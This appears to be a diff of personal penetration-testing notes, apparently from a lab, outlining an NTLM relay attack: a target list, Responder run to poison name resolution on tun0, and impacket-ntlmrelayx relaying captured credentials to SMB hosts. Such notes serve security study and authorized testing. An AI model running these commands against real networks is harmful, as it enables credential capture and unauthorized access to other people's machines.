@@ -5,7 +5,9 @@
 	  - can also do for whole network : `10.0.1.0/24`
 	  ![[Pasted image 20250328150412.png]]
 1. echo "10.0.1.10 \n 10.0.1.9" > targets.txt
-2. Edit responder file and run `responder`:
+2. Edit responder file and run `responder`: 
+	1. `sudo vi /etc/responder/Responder.conf`
+	2. `sudo responder -I tun0 -dwv `
 		![[Pasted image 20250328150900.png]]
 3. Setup `ntlm relay`
 	1. `impacket-ntlmrelayx -tf targets.txt -smb2support`
